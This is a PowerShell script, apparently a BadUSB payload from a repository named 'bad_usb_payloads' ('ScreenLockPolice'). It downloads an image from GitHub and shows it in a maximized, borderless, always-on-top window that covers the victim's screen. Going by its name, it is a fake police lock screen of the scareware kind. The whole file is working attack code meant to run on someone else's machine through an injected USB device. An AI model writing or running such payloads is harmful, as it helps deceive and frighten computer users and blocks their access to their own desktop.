# Créer une fenêtre WPF
Add-Type -AssemblyName PresentationFramework

# Récupère le dossier temporaire de l'utilisateur
$TempFolder = [System.IO.Path]::GetTempPath()

# Définir le chemin de l'image de fond d'écran
$wallpaperPath = Join-Path $TempFolder "wallpaper.png"

# Télécharge l'image de fond d'écran depuis GitHub et la place dans le dossier Images
Invoke-WebRequest -Uri "https://github.com/MagikarpLv13/bad_usb_payloads/raw/master/ScreenLockPolice/wallpaper.png" -OutFile $wallpaperPath

# XAML pour définir la fenêtre et l'image
$xaml = @"
<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        WindowStartupLocation="CenterScreen"
        WindowState="Maximized"
        WindowStyle="None"
        Background="Black"
        Topmost="True"
        AllowsTransparency="True">
    <Grid>
        <Image Name="imgBackground" Stretch="UniformToFill" HorizontalAlignment="Center" VerticalAlignment="Center"/>
    </Grid>
</Window>
"@

# Charger le XAML en utilisant XmlReader
$reader = [System.Xml.XmlReader]::Create((New-Object System.IO.StringReader $xaml))
$window = [Windows.Markup.XamlReader]::Load($reader)

# Charger l'image PNG
$imgSource = New-Object System.Windows.Media.Imaging.BitmapImage
$imgSource.BeginInit()
$imgSource.UriSource = New-Object Uri($wallpaperPath, [UriKind]::Absolute)
$imgSource.CacheOption = [System.Windows.Media.Imaging.BitmapCacheOption]::OnLoad
$imgSource.EndInit()

# Assigner l'image PNG à l'image dans la fenêtre
$window.FindName('imgBackground').Source = $imgSource

# Afficher la fenêtre
$window.ShowDialog()